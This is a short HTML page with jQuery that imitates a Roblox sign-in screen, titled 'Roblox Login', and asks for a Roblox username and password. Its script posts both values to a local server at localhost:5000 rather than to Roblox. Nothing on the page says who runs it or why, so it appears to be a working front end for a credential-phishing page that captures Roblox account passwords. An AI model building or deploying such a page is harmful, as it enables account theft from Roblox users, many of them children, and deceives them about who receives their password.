<!DOCTYPE html>
<html>
<head>
 <title>Roblox Account</title>
 <style>
   body {
     font-family: Arial, sans-serif;
   }

   .container {
     width: 100%;
     max-width: 600px;
     margin: 0 auto;
     padding: 20px;
     box-sizing: border-box;
   }

   .btn {
     display: inline-block;
     padding: 10px 20px;
     margin-top: 10px;
     text-decoration: none;
     background-color: #4CAF50;
     color: white;
     border-radius: 5px;
   }

   .btn:hover {
     background-color: #45a049;
   }
 </style>
 <script src="https://code.jquery.com/jquery-3.6.0.min.js"
></script>
</head>
<body>
 <div class="container">
   <h1>Roblox Login</h1>
   <p>Please enter your Roblox username:</p>
   <input type="text" id="username" />
   <p>Please enter your Roblox password:</p>
   <input type="password" id="password" />
   <a href="#" id="submit" class="btn">Submit</a>
 </div>

 <script>
    $(document).ready(function() {
      $("#submit").click(function(e) {
        e.preventDefault(); // Prevent the default action of the link
        var username = $("#username").val();
        var password = $("#password").val();

        $.ajax({
          url: "http://localhost:5000/roblox_login",
          type: "POST",
          data: { username: username, password: password },
          success: function(response) {
            console.log(response);
          },
          error: function(xhr, status, error) {
            console.log("Error: " + error);
          }
        });
      });
    });
 </script>
</body>
</html>
